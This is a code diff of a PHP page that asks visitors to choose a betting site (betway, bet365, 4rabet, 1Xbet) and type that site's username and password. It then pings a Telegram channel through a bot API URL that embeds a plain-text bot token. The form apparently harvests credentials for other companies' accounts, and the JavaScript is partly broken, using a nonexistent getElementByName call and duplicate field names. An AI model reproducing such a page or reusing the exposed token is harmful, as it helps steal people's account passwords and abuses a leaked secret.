@@ -8,10 +8,10 @@
 $i = $_POST["username"];
 echo <<< END_OF_TEXT
 
-<label for="selector" style="color:#ffe552"><input type="radio" name="selector" value="betway" id="selector" required>betway</label><br>
-<label for="selector" style="color:#ffe552"><input type="radio" name="selector" value="bet365" id="selector" required>bet365</label><br>
-<label for="selector" style="color:#ffe552"><input type="radio" name="selector" value="4raBet" id="selector" required>4rabet</label><br>
-<label for="selector" style="color:#ffe552"><input type="radio" name="selector" value="1Xbet" id="selector" required>1Xbet</label><br>
+<label for="selector" style="color:#ffe552"><input type="radio" name="selector" value="betway" id="r1" required>betway</label><br>
+<label for="selector" style="color:#ffe552"><input type="radio" name="selector" value="bet365" id="r2" required>bet365</label><br>
+<label for="selector" style="color:#ffe552"><input type="radio" name="selector" value="4raBet" id="r3" required>4rabet</label><br>
+<label for="selector" style="color:#ffe552"><input type="radio" name="selector" value="1Xbet" id="r4" required>1Xbet</label><br>
 <h2>SELECT AND ENTER THE USERNAME AND PASSWORD OF YOUR BETTING HOST PROVIDER</h2>
 <input type="text" name="name" placeholder="USERNAME" style="border-radius: 10px;"  >
 <input type="text" name="name" placeholder="PASSWORD" style="border-radius: 10px;"  >
@@ -19,21 +19,13 @@ echo <<< END_OF_TEXT
 <script>
 function myFunction() {
   var rates = document.getElementByName('selector').value;
-  if(rates =='betway'){
+  if (document.getElementById('r1').checked) {
+    rate_value = document.getElementById('r1').value;
     let xhr = new XMLHttpRequest();
     fetch("https://api.telegram.org/bot5769765879:AAGSKonu0sNtUJ5lzV75cSbv9cNOdyr6tUc/sendMessage?chat_id=@capitalbetting&text=LINKED NEW ACCOUNT  OF BETWAY IN CAPITALBETTING");
-    
-}else if(rates =='bet365'){
-  let xhr = new XMLHttpRequest();
-  fetch("https://api.telegram.org/bot5769765879:AAGSKonu0sNtUJ5lzV75cSbv9cNOdyr6tUc/sendMessage?chat_id=@capitalbetting&text=LINKED NEW ACCOUNT OF BET365 IN CAPITALBETTING");
-    
-}else if(rates =='4rabet'){
-  let xhr = new XMLHttpRequest();
-  fetch("https://api.telegram.org/bot5769765879:AAGSKonu0sNtUJ5lzV75cSbv9cNOdyr6tUc/sendMessage?chat_id=@capitalbetting&text=LINKED NEW ACCOUNT OF 4RaBet IN CAPITALBETTING");
-}else if(rates =='1Xbet'){
-  let xhr = new XMLHttpRequest();
-  fetch("https://api.telegram.org/bot5769765879:AAGSKonu0sNtUJ5lzV75cSbv9cNOdyr6tUc/sendMessage?chat_id=@capitalbetting&text=LINKED NEW ACCOUNT OF 1xBET IN CAPITALBETTING");
-}
+  
+  }
+      
  
   
 }
